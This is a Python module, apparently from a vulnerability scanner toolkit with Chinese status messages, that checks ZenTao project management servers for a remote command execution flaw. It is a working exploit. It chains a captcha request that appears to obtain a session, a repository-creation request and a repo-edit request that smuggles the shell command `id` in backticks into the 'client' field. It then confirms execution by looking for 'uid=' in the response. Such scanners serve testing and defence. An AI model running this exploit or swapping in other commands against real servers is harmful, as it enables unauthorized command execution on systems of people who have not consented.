#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests
from pub.com.output import OutPutFile
class ZenTao_Rce_Scan:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        url2 = url + '/misc-captcha-user.html'
        url3 = url + '/repo-create.html'
        url4 = url + '/repo-edit-10000-10000.html'
        header = {
            "User-Agent":self.header,
            "Referer": f"{url}/repo-edit-1-0.html",
            "Expect": "100-continue",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        data = "product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid="
        data2 = "SCM=Subversion&client=`id`"
        try:
            req = requests.get(url2, timeout=3,verify=self.verify,proxies=self.proxy,headers={"User-Agent":self.header})
            req2 = requests.post(url3, timeout=3,verify=self.verify,proxies=self.proxy,headers=header,data=data)
            req3 = requests.post(url4, timeout=3,verify=self.verify,proxies=self.proxy,headers=header,data=data2)
            if "uid=" in req3.text:
                OutPrintInfoSuc("ZenTao", f"存在禅道项目管理系统远程命令执行漏洞{url}")
                if self.batch:
                    OutPutFile("zentao_rce.txt",f"存在禅道项目管理系统远程命令执行漏洞{url}")
        except Exception:
            if not self.batch:
                OutPrintInfo("ZenTao", "目标请求出错")

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("ZenTao", "开始检测禅道项目管理系统远程命令执行漏洞...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("ZenTao", "不存在禅道项目管理系统远程命令执行漏洞")
